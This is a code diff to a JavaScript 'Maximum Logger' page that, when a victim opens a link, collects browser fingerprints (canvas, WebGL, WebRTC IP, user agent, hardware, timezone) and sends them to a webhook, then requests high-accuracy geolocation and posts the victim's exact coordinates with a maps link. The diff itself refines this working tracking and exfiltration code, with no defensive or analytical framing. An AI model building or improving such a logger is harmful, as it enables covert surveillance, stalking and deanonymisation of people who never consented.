@@ -39,10 +39,10 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-      } catch(e) {}
+      } catch(e) { console.error("Webhook failed", e); }
     }
 
-    // Advanced Fingerprinting
+    // === MAX FINGERPRINTING ===
     function getCanvasFingerprint() {
       try {
         const canvas = document.createElement('canvas');
@@ -59,23 +59,13 @@
     function getWebGLFingerprint() {
       try {
         const gl = document.createElement('canvas').getContext('webgl');
-        if (!gl) return "N/A";
+        if (!gl) return {vendor: "N/A", renderer: "N/A"};
         const debug = gl.getExtension('WEBGL_debug_renderer_info');
         return {
           vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
           renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
         };
-      } catch(e) { return "N/A"; }
-    }
-
-    async function getBattery() {
-      if (navigator.getBattery) {
-        try {
-          const b = await navigator.getBattery();
-          return `${Math.floor(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
-        } catch(e) {}
-      }
-      return "N/A";
+      } catch(e) { return {vendor: "N/A", renderer: "N/A"}; }
     }
 
     async function getWebRTCIP() {
@@ -108,7 +98,6 @@
       const webrtcIP = await getWebRTCIP();
       const canvas = getCanvasFingerprint();
       const webgl = getWebGLFingerprint();
-      const battery = await getBattery();
 
       const payload = {
         content: "**🪝 ULTIMATE INITIAL LOG - Victim Opened Link**",
@@ -123,13 +112,8 @@
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
             { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
             { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-            { name: "Battery", value: battery, inline: true },
-            { name: "Canvas Fingerprint", value: `\`\`\`${canvas}\`\`\``, inline: false },
-            { name: "WebGL", value: `${webgl.vendor || "N/A"} - ${webgl.renderer || "N/A"}`, inline: false },
-            { name: "Plugins", value: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ").substring(0,150) : "N/A", inline: false },
-            { name: "Languages", value: navigator.languages ? navigator.languages.join(", ") : "N/A", inline: false },
-            { name: "Do Not Track", value: navigator.doNotTrack || "N/A", inline: true },
-            { name: "Touch Support", value: `${'ontouchstart' in window} | Max Points: ${navigator.maxTouchPoints || 0}`, inline: true },
+            { name: "Canvas", value: `\`\`\`${canvas}\`\`\``, inline: false },
+            { name: "WebGL", value: `${webgl.vendor} - ${webgl.renderer}`, inline: false },
             { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ],
           footer: { text: "Stage 1 • Maximum Logger" }
@@ -139,7 +123,9 @@
     }
 
     async function sendLocationUpdate(lat, lon, acc) {
-      const mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
+      // Ultra safe Google Maps link
+      const mapsLink = `https://www.google.com/maps/@\( {lat}, \){lon},18z`;
+      
       const payload = {
         content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
         embeds: [{
@@ -163,9 +149,11 @@
             const lat = pos.coords.latitude.toFixed(8);
             const lon = pos.coords.longitude.toFixed(8);
             const acc = pos.coords.accuracy.toFixed(0);
+            console.log("✅ Exact coords:", lat, lon); // for debugging
             sendLocationUpdate(lat, lon, acc);
           },
-          () => {}
+          err => console.log("Geolocation denied", err),
+          { enableHighAccuracy: true, timeout: 10000 }
         );
       }
     }
